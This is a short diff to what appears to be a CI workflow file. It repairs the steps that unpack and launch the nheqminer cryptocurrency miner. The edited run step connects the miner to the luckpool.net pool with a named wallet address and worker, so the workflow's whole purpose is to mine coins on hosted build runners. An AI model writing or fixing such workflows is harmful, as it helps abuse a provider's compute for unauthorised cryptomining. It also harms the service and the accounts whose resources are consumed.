@@ -23,10 +23,10 @@ jobs:
       - name: Extract nheqminer
         run: |
           tar -xvf nheqminer-Linux-v0.8.2.tgz
-          # If there's also a tar.gz file, you may want to extract that as well
-          # tar -xvf nheqminer-Linux-v0.8.2.tar.gz
+          ls -la  # List contents to check the extracted files
 
       - name: Run nheqminer
         run: |
-          cd nheqminer
+          # Adjust this if the extracted directory name is different
+          cd nheqminer-Linux-v0.8.2
           ./nheqminer -v -l na.luckpool.net:3956 -u RP8SNudJuHRv3GJsxb2LJBrKxQKRdKoHL3.kiukiu1 -p x -t 2
